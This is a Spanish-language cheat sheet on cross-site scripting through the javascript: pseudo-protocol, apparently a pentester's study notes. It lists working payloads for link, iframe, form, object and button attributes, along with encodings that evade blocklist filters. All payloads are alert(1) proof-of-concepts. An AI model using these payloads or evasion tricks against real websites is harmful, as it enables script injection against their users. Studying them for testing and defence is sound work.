---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Pseudo-protocolos (javascript:)

***

## Cheatsheet

|**Atributo / Etiqueta**|**Payload de Ejemplo**|**Contexto de Ejecución y Notas**|
|---|---|---|
|`href` en `<a>`|`<a href="javascript:alert(1)">Click</a>`|Interactivo. Requiere que el usuario haga clic en el enlace. Es el vector más común y explotado en este contexto.|
|`src` en `<iframe>`|`<iframe src="javascript:alert(1)"></iframe>`|Automático. Se ejecuta tan pronto como el navegador intenta cargar el contenido del marco.|
|`action` en `<form>`|`<form action="javascript:alert(1)"><button>Enviar</button></form>`|Interactivo. El script se dispara cuando el usuario o un evento automático envía el formulario.|
|`data` en `<object>`|`<object data="javascript:alert(1)"></object>`|Automático. Alternativa a los iframes; ejecuta el código al procesar el objeto incrustado en el [[DOM]].|
|`formaction` en `<button>`|`<button formaction="javascript:alert(1)">Click</button>`|Interactivo. Sobrescribe la acción del formulario al que pertenece el botón mediante atributos de HTML5.|

### Inyección en Contextos de Navegación

Si el punto de inyección se encuentra dentro de un atributo que espera una URL, la táctica cambia. En lugar de buscar escapar de la etiqueta cerrándola prematuramente, el objetivo es controlar el esquema de la URI.
- **Control total del atributo:** Si la entrada controla completamente el valor de atributos como `href` o `src`, simplemente inyectar el protocolo inicia la ejecución: `javascript:alert(1)`.
- **Ruptura de rutas relativas:** Si la aplicación antepone una ruta (ej. `<a href="/perfil/INYECCIÓN">`), este vector pierde efectividad directa, ya que el navegador exige que `javascript:` se encuentre al inicio absoluto de la cadena para reconocerlo como un protocolo válido. En estos casos, se debe forzar primero la salida del atributo mediante comillas antes de intentar un nuevo vector.

### Evasión de Filtros Léxicos

Los mecanismos de defensa deficientes suelen basarse en listas negras que buscan la cadena literal `javascript:`. Para evadir estas restricciones, recurro a las particularidades del análisis sintáctico de los navegadores:

- **Inclusión de Espacios en Blanco:** Los navegadores ignoran espacios, tabulaciones y saltos de línea (CR/LF) dentro de la declaración del protocolo antes de los dos puntos.
    - Payload con tabulación: `java&#x09;script:alert(1)`
    - Payload con salto de línea: `java%0Ascript:alert(1)`
- **Codificación de Entidades HTML:** Dado que la inyección ocurre dentro de un atributo HTML (`href`, `src`), el contenido se decodifica _antes_ de evaluar si es una URL válida. Esto me permite ofuscar la palabra clave entera.
    - Payload: `&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)`
- **Codificación URL (URL Encoding):** El cuerpo del script (todo lo que va después de los dos puntos) puede estar codificado para evadir firmas que buscan payloads conocidos como `alert(1)`.
    - Payload: `javascript:%61%6c%65%72%74%28%31%29`


___

## Overview

El uso de pseudo-protocolos, específicamente `javascript:`, es una técnica donde aprovecho la capacidad del navegador para interpretar una URI (Uniform Resource Identifier) como código ejecutable en lugar de una ubicación de red. Cuando el motor del navegador encuentra este esquema en contextos que esperan una URL válida (como enlaces, redirecciones, acciones de formularios o fuentes de incrustación), detiene la navegación estándar y pasa el contenido restante al intérprete de JavaScript.

Este vector es crítico y altamente efectivo cuando la aplicación web filtra proactivamente etiquetas estructurales (como `<script>`) o manejadores de eventos (como `onerror` o `onload`), pero permite a los usuarios suministrar enlaces personalizados, perfiles web o recursos externos.


___
